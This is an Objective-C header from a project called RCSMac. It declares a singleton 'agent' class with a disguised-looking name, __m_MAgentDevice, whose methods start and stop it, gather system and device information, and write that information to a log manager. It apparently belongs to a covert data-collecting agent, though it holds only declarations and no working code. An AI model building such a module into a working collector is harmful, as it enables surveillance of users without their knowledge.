//
//  RCSMAgentDevice.h
//  RCSMac
//
//  Created by kiodo on 3/11/11.
//  Copyright 2011 __MyCompanyName__. All rights reserved.
//

#import <Foundation/Foundation.h>

#import "RCSMLogManager.h"

@interface __m_MAgentDevice : NSObject 
{    
@private
  NSMutableDictionary *mAgentConfiguration;
}

+ (__m_MAgentDevice *)sharedInstance;

- (id)copyWithZone: (NSZone *)aZone;
+ (id)allocWithZone: (NSZone *)aZone;

- (unsigned)retainCount;
- (id)retain;

- (void)release;
- (id)autorelease;

- (NSMutableDictionary *)mAgentConfiguration;
- (void)setAgentConfiguration: (NSMutableDictionary *)aConfiguration;

- (void)start;
- (BOOL)stop;
- (BOOL)writeDeviceInfo: (NSData*)aInfo;
- (NSData*)getSystemInfoWithType:(NSString*)aType;
- (BOOL)getDeviceInfo;


@end
